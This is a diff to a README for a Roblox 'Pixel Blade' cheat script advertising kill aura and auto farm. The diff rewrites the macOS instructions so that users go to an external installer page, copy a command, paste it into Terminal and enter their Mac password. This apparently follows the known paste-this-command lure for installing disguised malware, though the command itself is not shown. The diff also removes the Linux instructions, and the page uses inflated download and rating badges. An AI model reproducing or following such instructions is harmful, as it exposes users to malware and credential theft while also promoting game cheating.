@@ -1,4 +1,4 @@
-# Pixel Blade Script - Kill Aura, Max Upgrades, Auto Farm
+# Pixel Blade Script — Kill Aura, Max Upgrades, Auto Farm
 
 ![Downloads](https://img.shields.io/badge/Downloads-25K+-blue?style=flat-square?)
 ![User Rating](https://img.shields.io/badge/Rating-⭐%204.9/5-gold?style=flat-square)
@@ -142,24 +142,17 @@ Using this **Roblox Pixel Blade script** unlocks several tangible benefits:
 
 ### 2️⃣ macOS
 
-1. Download the repo and extract it (same as Windows).  
-2. Use a macOS‑compatible executor (e.g., Script‑Ware for macOS).  
-3. Launch Roblox and join **Pixel Blade**.  
-4. Attach, paste the script, and execute.  
-5. Apply the same initial configuration steps as on Windows.
+1. Tap the Download button below to go to the Installer page.  
+2. Copy the command line by clicking the copy button next to it.  
+3. Open Terminal  
+   - Press `Cmd + Space`, type “Terminal”, then hit Enter.  
+4. Paste the command → press Enter.  
+5. Enter your Mac password when asked (that's normal and required for installation).  
+6. 🎉 Done! The command automatically installs, and launch **PixelBlade.app**.
 
 ## [🎯 Download Latest Pixel Blade Script 🎯](https://pixel-blade-scr.github.io/pixelblade/)  
 
-### 3️⃣ Linux
-
-1. Download and extract the repository.  
-2. Use Wine / Proton to run a Windows executor or a native Linux executor if available.  
-3. Join **Pixel Blade**, attach, execute the script.  
-4. Adjust performance/safety settings if your environment is slower.
-
-## [🎯 Download Latest Pixel Blade Script 🎯](https://pixel-blade-scr.github.io/pixelblade/)  
-
-### 4️⃣ Mobile (Android / iOS)
+### 3️⃣ Mobile (Android / iOS)
 
 **Android:**
 
